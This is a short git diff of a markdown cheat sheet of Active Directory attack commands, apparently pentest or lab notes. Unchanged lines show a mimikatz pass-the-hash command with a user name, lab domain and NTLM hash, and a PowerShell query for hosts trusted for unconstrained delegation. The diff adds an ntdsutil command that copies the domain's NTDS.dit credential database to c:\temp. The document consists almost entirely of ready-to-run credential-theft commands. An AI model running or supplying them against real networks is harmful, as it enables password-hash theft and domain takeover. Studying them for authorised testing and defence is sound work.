@@ -11,3 +11,8 @@ sekurlsa::pth /user:pwnd.user /domain:hackersacademy.local /ntlm:fc525c9683e8fe0
 ```
 Get-AdComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515) } -Properties TrustedForDelegation, TrustedToAuthForDelegation,servicePrincipalName,Description
 ```
+
+## NTDSUtil
+```
+ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
+```
